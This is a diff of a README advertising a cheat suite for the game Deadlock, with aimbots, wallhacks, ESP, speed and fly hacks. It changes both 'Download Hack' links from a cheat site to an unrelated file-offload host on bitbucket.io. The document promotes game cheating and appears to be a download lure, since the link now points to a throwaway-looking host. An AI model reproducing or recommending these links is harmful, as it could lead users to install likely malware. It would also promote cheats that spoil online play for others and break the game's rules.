@@ -6,7 +6,7 @@
 
 This isn’t just aim assist. We’re talking **head-locking aimbots, ESP overlays, wallhacks, speed mods, and no recoil** — all in one cheat system built to **crush**.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🔥 Everything You Get in a Deadlock Hack Suite
@@ -43,7 +43,7 @@ This isn’t just aim assist. We’re talking **head-locking aimbots, ESP overla
 * ✅ **Fly Mode / Hover Hack** – Elevate mid-fight
 * ✅ **Teleport (Beta)** – Flash across the map in 1 key
 
-[![Download Hack](https://i.ytimg.com/vi/8Ty7Sc2HCa4/maxresdefault.jpg)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Hack](https://i.ytimg.com/vi/8Ty7Sc2HCa4/maxresdefault.jpg)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🆚 Deadlock With vs Without Hacks
